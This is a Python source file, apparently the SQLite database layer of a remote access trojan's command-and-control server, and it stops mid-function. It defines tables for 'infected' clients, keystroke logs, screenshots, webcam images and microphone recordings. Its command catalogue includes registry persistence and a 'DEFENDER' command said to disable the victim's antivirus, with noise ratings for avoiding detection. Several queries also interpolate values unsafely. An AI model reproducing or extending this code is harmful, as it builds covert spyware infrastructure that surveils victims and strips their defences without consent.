import base64
import os
import sqlite3
import datetime
import time
import hashlib
import secrets

IDLE_TIME = 0.5


class DataBase:
    main_database = r"server.db"
    connection = None
    connected = False
    connected = False

    # Table Names
    client_info = "client_info"  # Table with client info.
    keylog_data = "keylog_data"  # Table with key logger  data.
    client_connections = "client_connections"
    client_commands = "client_commands"
    server_config = "server_config"
    crypto_keys = "crypto_keys"
    status_codes = "status_codes"

    def __init__(self):
        return

    def init_database(self):  # Creates tables in DB
        self.connect_db()
        # Should check each table and maybe each column to ensure they are created and if not create them.
        try:
            self.connection.cursor().execute(f"SELECT COUNT(client_id) FROM {self.client_info}").fetchone()

        except sqlite3.OperationalError:
            # Creates client_info if it does not exist
            print('CREATING TABLE client_info')
            self.connection.cursor().execute(F"""
                CREATE TABLE "client_info" (
                    "client_id"	INTEGER NOT NULL UNIQUE,
                    "sID"	TEXT,
                    "mac_address"	INTEGER,
                    "client_ip"	char(15) NOT NULL,
                    "infected_date"	datetime NOT NULL,
                    "windows_username"	TEXT,
                    "os_info"	TEXT,
                    "system_manufacturer"	TEXT,
                    "ssid"	TEXT,
                    "net_user_name"	TEXT,
                    "name_net_card"	TEXT,
                    "auth_method"	TEXT,
                    "cipher_method"	TEXT,
                    "radio_type"	TEXT,
                    "cpu_arch"	TEXT,
                    "cpu_name"	TEXT,
                    "timezone"	TEXT,
                    PRIMARY KEY("client_id" AUTOINCREMENT)
                );
            """)

        try:
            self.connection.cursor().execute(f"SELECT COUNT(certificate_data) FROM server_certificates").fetchone()

        except sqlite3.OperationalError:
            # Creates client_info if it does not exist
            print('CREATING TABLE server_certificates')

            self.connection.cursor().execute(F"""
                CREATE TABLE "server_certificates" (
                    "certificate_data"	BLOB NOT NULL UNIQUE,
                    "private_key"	BLOB NOT NULL UNIQUE,
                    "service"	TEXT,
                    "creation_date"	datetime,
                    "country"	TEXT,
                    "state"	TEXT,
                    "common_name"	TEXT,
                    PRIMARY KEY("certificate_data")
                );
            """)

        try:
            self.connection.cursor().execute(f"SELECT COUNT(client_id) FROM {self.client_connections}").fetchone()

        except sqlite3.OperationalError:
            # Creates client_info if it does not exist
            print('CREATING TABLE client_connections')

            self.connection.cursor().execute(f"""
                CREATE TABLE "client_connections" (
                "client_id"	int,
                "client_ip"	TEXT NOT NULL,
                "client_port"	TEXT NOT NULL,
                "service"	TEXT NOT NULL,
                "connection_type"	bit,
                "date_info"	datetime,
                PRIMARY KEY("service","client_id","date_info","connection_type"),
                FOREIGN KEY("client_id") REFERENCES "client_info"("client_id")
            );
                """)
        try:
            self.connection.cursor().execute(f"SELECT COUNT(*) FROM log_data").fetchone()

        except sqlite3.OperationalError:
            # Creates client_info if it does not exist
            print('CREATING TABLE log_data')

            self.connection.cursor().execute(f"""
                CREATE TABLE "log_data" (
                "date_captured"	datetime NOT NULL,
                "message"	TEXT NOT NULL,
                "source"	TEXT NOT NULL,
                "severity"	INTEGER NOT NULL,
                PRIMARY KEY("date_captured","message","source","severity")
                );
                """)
        try:
            self.connection.cursor().execute(f"SELECT COUNT(*) FROM {'tcp_connections'}").fetchone()

        except sqlite3.OperationalError:
            print('CREATING TABLE tcp_connections')

            # Creates client_info if it does not exist
            self.connection.cursor().execute(f"""
                CREATE TABLE "tcp_connections" (
                "ip_address"	TEXT NOT NULL,
                "port"	TEXT NOT NULL,
                "service"	TEXT NOT NULL,
                "time"	datetime,
                PRIMARY KEY("ip_address","time","port")
                );""")

        try:
            self.connection.cursor().execute(f"SELECT COUNT(client_id) FROM client_configs").fetchone()
        except sqlite3.OperationalError:
            print('CREATING TABLE client_configs')
            self.connection.cursor().execute(f"""
                CREATE TABLE "client_configs" (
                    "client_id"	INTEGER NOT NULL,
                    "key_logger_enabled"	bit NOT NULL,
                    "data_server_enabled"	bit NOT NULL,
                    "favorite"	bit NOT NULL,
                    PRIMARY KEY("client_id"),
                    FOREIGN KEY("client_id") REFERENCES "client_info"("client_id")
                );
            """)

        try:
            self.connection.cursor().execute(f"SELECT COUNT(code) FROM {self.status_codes}").fetchone()

        except sqlite3.OperationalError:
            print('CREATING TABLE status_codes')
            self.connection.cursor().execute(f"""
                CREATE TABLE "status_codes" (
                "code"	INTEGER NOT NULL UNIQUE,
                "Description"	TEXT NOT NULL,
                PRIMARY KEY("code")
                );
            """)

            self.connection.cursor().execute("""
                INSERT INTO status_codes(code, description)
                VALUES(200, 'REPRESENTS A SUCCESSFUL ACTION, TRANSMISSION, STATUS');
            """)
            self.connection.commit()
            self.connection.cursor().execute("""
                INSERT INTO status_codes(code, description)
                VALUES(404, 'REPRESENTS A UNSUCCESSFUL ACTION, TRANSMISSION, STATUS');
            """)
            self.connection.commit()

            self.connection.cursor().execute("""
                INSERT INTO status_codes(code, description)
                VALUES(900, 'REPRESENTS A CLIENT TRYING TO CONNECT WITH A MAC NOT 
                AUTHENTICATED WITH THE SERVERS ON-HAND IDENTIFIER KEY');
            """)
            self.connection.commit()

        try:
            self.connection.cursor().execute(f"SELECT COUNT(client_id) FROM {self.client_commands}").fetchone()

        except sqlite3.OperationalError:
            print('CREATING TABLE client_commands')
            self.connection.cursor().execute(f"""
                CREATE TABLE {self.client_commands} (
                "client_id"	int NOT NULL,
                "command" TEXT NOT NULL,
                "command_date"	datetime NOT NULL,
                "return_status"	INTEGER NOT NULL,
                FOREIGN KEY("client_id") REFERENCES "client_info"("client_id"),
                PRIMARY KEY("command_date")
                ); """)

        try:
            self.connection.cursor().execute(f"SELECT COUNT(client_id) FROM {self.keylog_data}").fetchone()

        except sqlite3.OperationalError:
            print('CREATING TABLE keylog_data')
            self.connection.cursor().execute(f"""
                    CREATE TABLE "keylog_data" (
                        "client_id"	int NOT NULL,
                        "log_data"	varchar(1024) NOT NULL,
                        "date_info"	datetime NOT NULL,
                        "offline_data"	bit,
                        FOREIGN KEY("client_id") REFERENCES "client_info"("client_id"),
                        PRIMARY KEY("date_info","client_id")
                    );
                """)

        try:
            rows = self.connection.cursor().execute(f"SELECT COUNT(*) FROM {self.server_config}").fetchone()
            if rows[0] == 0:
                self.connection.cursor().execute("""
                    INSERT INTO server_config (command_server, key_logger_server, data_server)
                    VALUES(1, 1, 0)
                """)
        except sqlite3.OperationalError:
            print('CREATING TABLE server_config')
            self.connection.cursor().execute(
                f"""
                    CREATE TABLE "server_config" (
                        "command_server"	bit NOT NULL,
                        "key_logger_server"	bit NOT NULL,
                        "data_server"	bit NOT NULL
                    );
                """)
            # Inserts default values if no config exists.
            self.connection.cursor().execute("""
                INSERT INTO server_config (command_server, key_logger_server, data_server)
                VALUES(1, 1, 0)
            """)
            self.connection.commit()

        try:
            self.connection.cursor().execute(f"SELECT COUNT(private_key) FROM {self.crypto_keys}").fetchone()
        except sqlite3.OperationalError:
            print('CREATING TABLE crypto_keys')
            self.connection.cursor().execute(
                f"""
                    CREATE TABLE "crypto_keys" (
                        "private_key"	BLOB NOT NULL UNIQUE,
                        "public_key"	BLOB NOT NULL UNIQUE,
                        "symmetric_key"	BLOB UNIQUE,
                        "date_added"	datetime NOT NULL,
                        PRIMARY KEY("private_key")
                    );
                """)

        try:
            self.connection.cursor().execute(f"SELECT COUNT(client_id) FROM screenshots").fetchone()
        except sqlite3.OperationalError:
            print('CREATING TABLE screenshots')
            self.connection.cursor().execute(
                f"""
                CREATE TABLE "screenshots" (
                    "client_id"	INTEGER NOT NULL,
                    "image"	BLOB NOT NULL,
                    "date_captured"	datetime NOT NULL UNIQUE,
                    PRIMARY KEY("date_captured"),
                    FOREIGN KEY("client_id") REFERENCES "client_info"("client_id")
                );
                   """)

        try:
            self.connection.cursor().execute(f"SELECT COUNT(client_id) FROM webcam_pics").fetchone()
        except sqlite3.OperationalError:
            print('CREATING TABLE webcam_pics')
            self.connection.cursor().execute("""
                CREATE TABLE "webcam_pics" (
                "client_id"	INTEGER NOT NULL,
                "image"	BLOB NOT NULL,
                "date_captured"	datetime NOT NULL,
                PRIMARY KEY("date_captured")
            );""")

        try:
            self.connection.cursor().execute(f"SELECT COUNT(client_id) FROM audio_recordings").fetchone()
        except sqlite3.OperationalError:
            print('CREATING TABLE audio_recordings')
            self.connection.cursor().execute("""
                CREATE TABLE "audio_recordings" (
                    "client_id"	INTEGER,
                    "audio_clip"	BLOB,
                    "seconds"	INTEGER,
                    "date"	datetime
                );""")

        try:
            self.connection.cursor().execute(f"SELECT COUNT(command_name) FROM command_desc").fetchone()
        except sqlite3.OperationalError:
            print('CREATING TABLE command_desc')
            self.connection.cursor().execute("""
                CREATE TABLE "command_desc" (
                    "command_name"	TEXT NOT NULL,
                    "description"	TEXT,
                    "noise_level"	INTEGER,
                    PRIMARY KEY("command_name")
                );
                """)

            data = [('SCREENSHOT', 'TAKES A SCREENSHOT OF THE SPECIFIED CLIENTS COMPUTER', 1),
                    ('WEBCAM', 'TAKES A IMAGE OF THE CLIENT USING THEIR WEBCAM', 1),
                    ('AUDIO', 'TAKES AN AUDIO RECORDING OF A SPECIFIED SIZE ON THE SPECIFIED CLIENT', 1),
                    ('KILL', 'KILLS THE RUNNING CLIENT INSTANCE ON THE CLIENT SIDE', 1),
                    ('STARTUP', 'ADDS THE CLIENT EXECUTABLE TO THE REGISTRY STARTUP', 3),
                    ('DEFENDER', 'DISABLES 5 DEFENDER SYSTEMS ESSENTIALLY DISABLING USERS DEFENSES. '
                                 'HAS A VERY HIGH NOISE LEVEL AND WILL LIKELY TRIGGER ANTI-VIRUS', 3)]

            self.connection.executemany("""
                INSERT into command_desc (command_name, description, noise_level)
                VALUES(?, ?, ?)
            """, data)
            self.connection.commit()

        try:
            self.connection.cursor().execute(f"SELECT COUNT(command) FROM command_parameters").fetchone()
        except:
            self.connection.cursor().execute(f"""
                CREATE TABLE "command_parameters" (
                "command"	TEXT NOT NULL,
                "parameter_name"	TEXT NOT NULL,
                "parameter_description"	TEXT,
                FOREIGN KEY("command") REFERENCES "command_desc"("command_name"),
                PRIMARY KEY("command","parameter_name")
            );""")

            self.connection.cursor().execute(f"""

                INSERT INTO command_parameters(command, parameter_name, parameter_description)
                VALUES('SCREENSHOT', 'Screenshot Quantity', 'Sets the screenshot quantity to capture of the target')
            """)
            self.connection.commit()

            self.connection.cursor().execute(f"""

                INSERT INTO command_parameters(command, parameter_name, parameter_description)
                VALUES('SCREENSHOT', 'Screenshot Time Interval', 'Sets the time interval in seconds to wait until the next screenshot is taken')
            """)
            self.connection.commit()

            self.connection.cursor().execute(f"""

                INSERT INTO command_parameters(command, parameter_name, parameter_description)
                VALUES('WEBCAM', 'Photo Quantity', 'Sets the photo quantity to capture of the target via camera')
            """)
            self.connection.commit()

            self.connection.cursor().execute(f"""

                INSERT INTO command_parameters(command, parameter_name, parameter_description)
                VALUES('WEBCAM', 'Webcam Time Interval', 'Sets the time interval in seconds to wait until the next webcam capture is taken')
            """)
            self.connection.commit()

            self.connection.cursor().execute(f"""

                INSERT INTO command_parameters(command, parameter_name, parameter_description)
                VALUES('AUDIO', 'Audio Duration', 'Sets the duration of the audio recording from the target via microphone')
            """)
            self.connection.commit()

        self.disconnect_db()

    def getBlobData(self, table_name, column_name, date_captured):
        if not self.connected:
            self.connect_db()
        blobData = self.connection.cursor().execute(f"""
            SELECT {column_name} 
            FROM {table_name}
            WHERE date_captured = '{date_captured}';
        """).fetchone()[0]

        if self.connected:
            self.disconnect_db()

        return blobData




    def get_name(self, sID):
        self.connect_db()
        host_name = self.connection.cursor().execute(f"SELECT (windows_username) FROM client_info WHERE client_id = ?;",
                                                     (sID,)).fetchone()
        self.disconnect_db()
        if not host_name:
            print('NO HOST NAME AVAILABLE FOR THE GIVEN SID')
            return None

        return host_name[0]

    def client_exists(self, sID):
        self.connect_db()
        return_val = self.connection.cursor().execute(f"SELECT (client_id) FROM client_info WHERE sID = ?;",
                                                      (sID,)).fetchone()
        if return_val is None:
            print('CLIENT DOES NOT EXIST')
            return False
        else:
            return True

    def row_exists(self, table, **kwargs):  # table, value1, value2
        query = "SELECT *"
        query = query + " FROM " + table  # Adds table to query

        if bool(kwargs):  # Adds filter for query
            query = query + " WHERE "
            for key, value in kwargs.items():
                query = query + key + " == " + value + " AND "

        query = query[:-4]  # Removes last AND
        query = query + ";"  # Adds semicolon
        try:
            self.connect_db()
            if self.connection.cursor().execute(query).fetchone():  # Row exists
                self.disconnect_db()
                return True
            else:  # Row does not exist
                self.disconnect_db()
                return False
        except sqlite3.OperationalError:
            self.disconnect_db()
            return False

    def connect_db(self):
        while not self.connected:
            try:
                if not self.connected:
                    self.connection = sqlite3.connect(self.main_database, check_same_thread=False)
                    self.connection.isolation_level = None
                    self.connection.cursor()
                    self.connected = True
            except sqlite3.OperationalError as Error:
                print(f'LOCKED WAIT {IDLE_TIME} SECONDS')
                time.sleep(IDLE_TIME)

    def disconnect_db(self):
        if self.connection:
            try:
                self.connection.cursor().close()
                self.connected = False
            except sqlite3.ProgrammingError as Error:
                print(f'LOW LEVEL ERROR : {Error}')

    def get_server_config(self):
        self.connect_db()
        config = self.connection.cursor().execute(f"""SELECT * FROM {self.server_config};""").fetchone()
        if not config:
            print('NO CONFIG FOUND')
            self.disconnect_db()
            return None
        self.disconnect_db()
        return config

    def keylogger_enabled(self, client_id):
        self.connect_db()
        status = self.connection.cursor().execute(f"""
            SELECT key_logger_enabled
            FROM client_configs 
            WHERE client_id = {client_id};
        """).fetchone()[0]
        return status

    def authenticated(self, mac_address, sID):

        self.connect_db()
        record_count = self.connection.cursor().execute(f"""
            SELECT COUNT(client_id) 
            FROM client_info 
            WHERE mac_address = {mac_address} AND sID = '{sID}';

        """).fetchone()
        if record_count[0] > 0:
            return True
        else:
            return False

    def hash_user(self, sID):
        # Should use more than sID to guarantee unique identifying of each different environment, os, hardware
        # Generate a random nonce to use as a salt for the hash
        nonce = secrets.token_hex(16)

        # Convert the ID and nonce to bytes
        sID_bytes = str.encode(sID)
        nonce_bytes = str.encode(nonce)

        # Combine the ID and nonce bytes
        combined_bytes = sID_bytes + nonce_bytes
        # Hash the combined bytes using SHA-256
        hash_object = hashlib.sha256(combined_bytes)

        # Convert the resulting hash to a string and return it
        return hash_object.hexdigest()

    def load_certificate(self, service):
        self.connect_db()
        certificate = self.connection.cursor().execute(f"""

        SELECT certificate_data 
        FROM server_certificates
        WHERE service = ?
        ORDER BY creation_date 
        DESC LIMIT 1;

    """, (service,)).fetchone()
        self.disconnect_db()
        return certificate[0]

    def load_key(self, service):
        self.connect_db()
        private_key = self.connection.cursor().execute(f"""

            SELECT private_key 
            FROM server_certificates
            WHERE service = ?
            ORDER BY creation_date 
            DESC LIMIT 1;

        """, (service,)).fetchone()
        self.disconnect_db()
        return private_key[0]

    def get_certificate_info(self):
        self.connect_db()
        info = self.connection.cursor().execute(f"""
            SELECT country, state, common_name
            FROM server_certificates
            WHERE service = 'COMMAND'
            ORDER BY creation_date 
            DESC LIMIT 1;
        """).fetchone()
        self.disconnect_db()
        return info

    def upload_certificate(self, cert_path, private_key_path, service, country, state, common_name):
        self.connect_db()

        certificate = open(cert_path, 'rb').read()
        private_key = open(private_key_path, 'rb').read()
        utc_time_iso = datetime.datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')
        self.connection.cursor().execute(f"""
            INSERT INTO server_certificates (certificate_data, private_key, service, creation_date, country, state, common_name)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (certificate, private_key, service,utc_time_iso, country, state, common_name))
        self.connection.commit()

        self.disconnect_db()

    def certificate_exists(self, service):
        self.connect_db()
        return_val = self.connection.cursor().execute(f"""
                                                    SELECT (certificate_data)
                                                    FROM server_certificates 
                                                    WHERE service = '{service}';""").fetchone()
        if return_val is None:
            self.disconnect_db()
            return False
        else:
            self.disconnect_db()
            return True

    def insert_config(self):
        self.connect_db()
        command_server = input('ENTER [1] TO ENABLE THE COMMAND SERVER.\nENTER [2] TO DISABLE THE COMMAND SERVER.\n> ')
        keylogger_server = input('ENTER [1] TO ENABLE THE KEY LOGGER SERVER.\n'
                                 'ENTER [2] TO DISABLE THE KEY LOGGER SERVER.\n> ')
        # self.connect_db()
        if command_server != 1 or not 0:
            return

        self.connection.execute("""
                INSERT INTO server_config (command_server, key_logger_server, data_server)
                VALUES(?, ?, ?)
            """, (command_server, keylogger_server, 0))
        self.connection.commit()
        self.disconnect_db()

    def time_stamp(self):
        time_stamp = datetime.datetime.utcnow().isoformat(sep=" ", timespec='milliseconds')
        return time_stamp

    def add_client(self, client_address, mac_address):
        self.connect_db()
        # Adds client to DB and returns client ID
        client = self.connection.cursor().execute(f"""SELECT client_id FROM {self.client_info} 
                                        WHERE Sid = {mac_address}""").fetchone()
        # Query's DB to find User

        if client is None:  # No client exists.
            print('CLIENT DOES NOT EXIST')

        self.disconnect_db()
        self.log_client_connection_wID(client[0], client_address, 'COMMAND', 1)  # Sends client_id
        client_id = client[0]
        return client_id

    def add_new_client(self, enumeration_info, client_port):

        print(f'ENUMERATION[2] = {enumeration_info[2]}')
        print(f'ENUMERATION[1] = {enumeration_info[1]}')
        print(f'ENUMERATION[0] = {enumeration_info[0]}')

        if not self.connected:
            self.connect_db()

        # Adds client to DB and returns client ID
        client = self.connection.cursor().execute(f"""SELECT client_id FROM {self.client_info} 
                                        WHERE sID = '{enumeration_info[1]}'""").fetchone()
        # Query's DB to find User

        if client is None:  # No client exists.
            utc_time_iso = datetime.datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')
            self.connection.cursor().execute(
                """
                INSERT INTO client_info (
                 client_ip, sID,  mac_address,   windows_username,   os_info,            system_manufacturer, 
                           ssid,            net_user_name,      name_net_card,      auth_method,         cipher_method, 
                 radio_type,    cpu_arch,       cpu_name,           timezone,           infected_date)
                VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);""", (
                    enumeration_info[0], enumeration_info[1], enumeration_info[2], enumeration_info[3],
                    enumeration_info[4], enumeration_info[5],
                    enumeration_info[6], enumeration_info[7], enumeration_info[8],
                    enumeration_info[9], enumeration_info[10], enumeration_info[11],
                    enumeration_info[12], enumeration_info[13], enumeration_info[14], utc_time_iso))
            # Inserts new client
            self.connection.commit()

            client = self.connection.cursor().execute(f"""
                                 SELECT client_id
                                 FROM {self.client_info}
                                 WHERE sID = '{enumeration_info[1]}'""").fetchone()  # Reads client.
        else:
            print('CLIENT EXISTS ALREADY IN DB!')

        if self.connected:
            self.disconnect_db()

       # self.log_client_connection_wID(client[0], (enumeration_info[1], client_port), 'COMMAND', 1)
        client_id = client[0]
        return client_id

    def log_clients_offline(self, client_handles, service):
        if not self.connected:
            self.connect_db()

        if len(client_handles) == 0:
            return

        # Prepare the data for insertion
        for client in client_handles:
            if client.client_id is None or client.client_address is None:
                return

        data_to_insert = [(client.client_id, client.client_address[0], client.client_address[1], service, 0) for client
                          in client_handles]

        # Get the current timestamp with milliseconds
        current_time = datetime.datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')

        # Define the SQL INSERT statement
        insert_query = """
            INSERT INTO client_connections (client_id, client_ip, client_port, service, connection_type, date_info)
            VALUES (?, ?, ?, ?, ?, ?);
        """

        # Execute the INSERT statement with executemany
        self.connection.executemany(insert_query,
                                    [(client[0], client[1], client[2], client[3], client[4], current_time) for client in
                                     data_to_insert])

        # Commit the changes to the database
        self.connection.commit()

    def deleteRow(self, table, condition_values):
        self.connect_db()

        try:
            blobColumns = ['image', 'audio_clip']
            # Build the SQL query to delete rows based on condition_values
            columns = self.connection.cursor().execute(f"PRAGMA table_info({table})").fetchall()

            column_names = []
            placeholders = []

            for column in columns:
                column_name = column[1]
                if column_name not in blobColumns:
                    column_names.append(column_name)
                    placeholders.append(f"{column_name} = ?")

            column_names_str = ', '.join(column_names)
            placeholders_str = ' AND '.join(placeholders)

            query = f"DELETE FROM {table} WHERE {placeholders_str}"

            print(query)
            self.connection.cursor().execute(query, condition_values)
            self.connection.commit()

            print(f"Deleted row from {table} with condition values: {condition_values}")

        except sqlite3.Error as e:
            print(f"Error deleting row: {e}")

        self.disconnect_db()

    def getMostRecentImage(self, type):
        if not self.connected:
            self.connect_db()
        if type == 'SCREENSHOT':
            screenshot_data = self.connection.cursor().execute(f"""
            SELECT image
            FROM screenshots
            WHERE date_captured = (SELECT MAX(date_captured) FROM screenshots);
            """).fetchone()[0]
            return screenshot_data
        elif type == 'WEBCAM':
            photo_data = self.connection.cursor().execute(f"""
            SELECT image
            FROM webcam_pics
            WHERE date_captured = (SELECT MAX(date_captured) FROM webcam_pics);
            """).fetchone()[0]
            return photo_data

        if self.connected:
            self.disconnect_db()

    def log_client_connection_wID(self, client_id, client_address, service, connection):
        if not self.connected:
            self.connect_db()

        utc_time_iso = datetime.datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')
        self.connection.execute("""
            INSERT INTO client_connections (client_id, client_ip, client_port, service, connection_type, date_info)
            VALUES(?, ?, ?, ?, ?, ?);
        """, (client_id, client_address[0], client_address[1], service, connection, utc_time_iso))
        self.connection.commit()
        time.sleep(IDLE_TIME)

        if self.connected:
            self.disconnect_db()

    def log_client_connection(self, client_address, service, connection):
        if not self.connected:
            self.connect_db()

        utc_time_iso = datetime.datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')
        self.connection.execute("""
            INSERT INTO client_connections (client_ip, client_port, service, connection_type, date_info)
            VALUES(?, ?, ?, ?, ?);
        """, (client_address[0], client_address[1], service, connection, utc_time_iso))
        self.connection.commit()
        time.sleep(IDLE_TIME)
        if self.connected:
            self.disconnect_db()

    def log_tcp_connection(self, client_address, service):
        if not self.connected:
            self.connect_db()
        utc_time_iso = datetime.datetime.utcnow().isoformat(sep=' ', timespec='milliseconds')
        self.connection.execute("""
            INSERT INTO tcp_connections (ip_address, port, service, time)
            VALUES(?, ?, ?, ?);
        """, (client_address[0], client_address[1], service, utc_time_iso))
        self.connection.commit()
        time.sleep(IDLE_TIME)
        if self.connected:
            self.disconnect_db()

    def get_client_id(self, sID):
        if not self.connected:
            self.connect_db()

        client_id = self.connection.cursor().execute(f"""
            SELECT client_id 
            FROM client_info 
            WHERE sID = '{sID}';""").fetchone()
        if client_id is not None:
            return client_id[0]
        else:
            return None

        if self.connected:
            self.disconnect_db

    def updateCommandServerConfig(self, commandServerValue):
        if not self.connected:
            self.connect_db()

        self.update_all_rows('server_config', {'command_server' : commandServerValue})

        if self.connected:
            self.disconnect_db()

    def updateKeyloggerServerConfig(self, keyloggerServerValue):
        if not self.connected:
            self.connect_db()

        self.update_all_rows('server_config', {'key_logger_server' : keyloggerServerValue})

        if self.connected:
            self.disconnect_db()

    def modify_server_config(self, type):
        if not self.connected:
            self.connect_db()

        curr_config = list(self.get_server_config())
        columns = ['COMMAND SERVER', 'KEY LOGGER SERVER', 'DATA SERVER']
        self.print_table(columns, [curr_config, ])
        curr_config = {'command_server': curr_config[0],
                       'key_logger_server': curr_config[1], 'data_server': curr_config[2]}
        if type == '0':  # Modify all settings
            command = input(f'COMMAND SERVER STATUS:\n[0] - DISABLE\n[1] - ENABLE\n>')
            keylogger = input(f'KEY LOGGER SERVER STATUS:\n[0] - DISABLE\n[1] - ENABLE\n>')
            data_server = input(f'DATA SERVER STATUS:\n[0] - DISABLE\n[1] - ENABLE\n>')

            data = {'command_server': command, 'key_logger_server': keylogger, 'data_server': data_server}
            self.update_all_rows('server_config', data)

        elif type == '1':  # Toggle Command server
            command = None
            while command != '0' and command != '1':
                command = input(f'COMMAND SERVER STATUS:\n[0] - DISABLE\n[1] - ENABLE\n>')
            curr_config['command_server'] = command
            self.update_all_rows('server_config', curr_config)
        elif type == '2':  # Toggle Key logger server
            keylogger = None
            while keylogger != '0' and keylogger != '1':
                keylogger = input(f'KEY LOGGER SERVER STATUS:\n[0] - DISABLE\n[1] - ENABLE\n>')
            curr_config['key_logger_server'] = keylogger
            self.update_all_rows('server_config', curr_config)

        elif type == '3':  # Tggle data server
            data_server = None
            while data_server != '0' and data_server != '1':
                data_server = input(f'DATA SERVER STATUS:\n[0] - DISABLE\n[1] - ENABLE\n>')
            curr_config['data_server'] = data_server
            self.update_all_rows('server_config', curr_config)

        if self.connected:
            self.disconnect_db()

    def modify_config_all(self, type_choice):
        if not self.connected:
            self.connect_db()

        choice = '-2'  # Random value
        while int(choice) not in range(-1, 3):

            choice = input('''[0] -  UPDATE ALL SETTINGS\
                           \n[1] -  TOGGLE KEY LOGGER ON/OFF\n[2] -  TOGGLE DATA SERVER ON/OFF\n[B] - BACK\n>''')
            if choice.upper() == 'B':
                return
            if choice == '0':  # Updates all fields in client config
                keylogger_setting = None
                dataserver_setting = None

                # Gets setting values
                while keylogger_setting != '0' and keylogger_setting != '1':
                    keylogger_setting = input('KEY LOGGER SETTING:\n[0] - DISABLE\n[1] - ENABLE\n>')
                while dataserver_setting != '0' and dataserver_setting != '1':
                    dataserver_setting = input('DATA SERVER SETTING:\n[0] - DISABLE\n[1] - ENABLE\n>')

                self.update_all_rows("client_configs", {"key_logger_enabled": keylogger_setting,
                                                        "data_server_enabled": dataserver_setting})

            elif choice == '1':  # Updates key logger specific field from specific client in client config
                keylogger_setting = None
                while keylogger_setting != '0' and keylogger_setting != '1':
                    keylogger_setting = input('KEY LOGGER SETTING:\n[0] - DISABLE\n[1] - ENABLE\n>')
                    self.update_all_rows("client_configs", {"key_logger_enabled": keylogger_setting})
            elif choice == '2':
                dataserver_setting = None
                while dataserver_setting != '0' and dataserver_setting != '1':
                    dataserver_setting = input('DATA SERVER SETTING:\n[0] - DISABLE\n[1] - ENABLE\n>')
                    self.update_all_rows("client_configs", {"data_server_enabled": dataserver_setting})
            else:
                print('INVALID OPTION')

            if self.connected:
                self.disconnect_db()

    def modify_config(self, client_id, type_choice):
        if not self.connected:
            self.connect_db()

        choice = '-2'
        while int(choice) not in range(-1, 3):

            choice = input('''[0] -  UPDATE ALL SETTINGS\
                           \n[1] -  TOGGLE KEY LOGGER ON/OFF\n[2] -  TOGGLE DATA SERVER ON/OFF\n[B] - BACK\n>''')
            if choice.upper() == 'B':
                return

            if choice == '0':  # Updates all fields in specified client config
                keylogger_setting = None
                dataserver_setting = None

                # Gets setting values
                while keylogger_setting != '0' and keylogger_setting != '1':
                    keylogger_setting = input('KEY LOGGER SETTING:\n[0] - DISABLE\n[1] - ENABLE\n>')
                while dataserver_setting != '0' and dataserver_setting != '1':
                    dataserver_setting = input('DATA SERVER SETTING:\n[0] - DISABLE\n[1] - ENABLE\n>')

                self.update_row("client_configs", {"key_logger_enabled": keylogger_setting,
                                                   "data_server_enabled": dataserver_setting}, "client_id", client_id)

            elif choice == '1':  # Updates key logger specific field from specific client in client config
                keylogger_setting = None
                while keylogger_setting != '0' and keylogger_setting != '1':
                    keylogger_setting = input('KEY LOGGER SETTING:\n[0] - DISABLE\n[1] - ENABLE\n>')
                    self.update_row("client_configs", {"key_logger_enabled": keylogger_setting}, "client_id", client_id)

            elif choice == '2':
                dataserver_setting = None
                while dataserver_setting != '0' and dataserver_setting != '1':
                    dataserver_setting = input('DATA SERVER SETTING:\n[0] - DISABLE\n[1] - ENABLE\n>')
                    self.update_all_rows("client_configs", {"data_server_enabled": dataserver_setting})
            else:
                print('INVALID OPTION')

            if self.connected:
                self.disconnect_db()

    def modifyClientConfig(self, client_id, config):
        # Config should have keylogger setting, data server setting, favorite setting
        if not self.connected:
            self.connect_db()
        columns = ['key_logger_enabled', 'data_server_enabled', 'favorite']
        tableData = {}
        for column, value in zip(columns, config):
            tableData[column] = value

        self.update_row('client_configs', tableData, 'client_id', client_id) # Updates client_configs table with
        # config values on the row where the client id is equal to specified client_id

        if self.connected:
            self.disconnect_db()

    def update_all_rows(self, table_name, set_values):
        print('UPDATED CONFIG')
        # Does not open DB. Caller function should have it open already.

        # Construct the SET clause of the UPDATE statement
        set_clause = ', '.join([f"{col} = ?" for col in set_values.keys()])

        # Construct the parameter list for the UPDATE statement
        params = tuple(set_values.values())

        # Construct and execute the UPDATE statement
        update_stmt = f"UPDATE {table_name} SET {set_clause}"
        self.connection.execute(update_stmt, params)
        # Commit the changes to the database and close the connection
        self.connection.commit()

    def update_row(self, table_name, set_values, condition_col, condition_val):

        # Does not open DB. Caller function should have it open already.

        # Construct the SET clause of the UPDATE statement
        set_clause = ', '.join([f"{col} = ?" for col in set_values.keys()])

        # Construct the parameter list for the UPDATE statement
        params = tuple(set_values.values()) + (condition_val,)

        # Construct and execute the UPDATE statement
        update_stmt = f"UPDATE {table_name} SET {set_clause} WHERE {condition_col} = ?"
        self.connection.execute(update_stmt, params)

        # Commit the changes to the database and close the connection
        self.connection.commit()

    def update_row_specific(self, table_name, set_values):

        # Does not open DB. Caller function should have it open already.

        # Construct the SET clause of the UPDATE statement
        set_clause = ', '.join([f"{col} = ?" for col in set_values.keys()])

        # Construct the parameter list for the UPDATE statement
        params = tuple(set_values.values())

        # Construct and execute the UPDATE statement
        update_stmt = f"UPDATE {table_name} SET {set_clause}"
        self.connection.execute(update_stmt, params)

        # Commit the changes to the database and close the connection
        self.connection.commit()

    def get_client_info(self):
        if not self.connected:
            self.connect_db()
        client_table = self.connection.cursor().execute(f"""
            SELECT * FROM client_info
        """).fetchall()
        if self.connected:
            self.disconnect_db()
        return client_table

    def getDatabaseTables(self):
        if not self.connected:
            self.connect_db()

        tableNames = self.connection.cursor().execute(f"""
        SELECT name FROM sqlite_master WHERE type='table';
        """).fetchall()
        tables = []
        for table in tableNames:
            tables.append(table[0])

        if self.connected:
            self.disconnect_db()

        return tables

    def getTableColumns(self, table_name):
        # Fetch all the rows from the query result
        if not self.connected:
            self.connect_db()

        columns_info = self.connection.cursor().execute(f"PRAGMA table_info({table_name})").fetchall()

        # Extract column names from the result
        column_names = [column[1] for column in columns_info]

        if self.connected:
            self.disconnect_db()

        return column_names

    def getTableData(self, table_name, **kwargs):
        if not self.connected:
